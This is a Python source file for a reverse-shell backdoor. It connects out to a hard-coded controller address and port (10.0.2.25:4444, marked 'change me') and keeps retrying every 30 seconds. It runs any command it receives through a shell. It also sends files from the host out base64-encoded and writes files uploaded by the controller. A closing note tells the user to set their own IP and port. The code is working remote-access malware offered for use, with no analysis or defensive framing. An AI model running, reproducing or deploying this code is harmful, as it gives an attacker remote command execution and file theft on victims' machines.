import socket
import subprocess
import json
import time
import os
import base64


def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + sock.recv(1024)
            return json.loads(json_data)
        except:
            continue

def connect(direc, porto):
    time.sleep(30)
    try:
        sock.connect((direc, porto))
        shell()
        connect(direc,porto)
    except:
        connect(direc, porto)

def shell():
    while True:
        command = reliable_recv()
        if command == "-q":
            break

        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue

        elif command[:8] == "download":
            try:
                with open(command[9:], "rb") as file:
                    reliable_send(base64.b64encode(file.read()))
                    reliable_send("[+]File downloaded")
            except:
                continue

        elif command[:6] == "upload":
            try:
                with open(command[7:], "wb") as file:
                    try:
                        expect = reliable_recv()
                        file.write(base64.b64decode(expect))
                        reliable_send("[+]File uploaded")
                    except:
                        reliable_send("[!!!]Could not upload the file")
                        continue
            except:
                continue

        else:
            try:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                # Esto nos dara el resultado del subprocess sin imprimirlo
                response = process.stdout.read() + process.stderr.read()
                # response contendra los resultados y los resultados de errores
                reliable_send(response)
            except:
                continue

IP = "10.0.2.25" #Change me
PORT = 4444 #Change me

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect(IP,PORT)



sock.close()

"""NOTES:
-You will have to change the IP and the PORT to those you want to connect to 
"""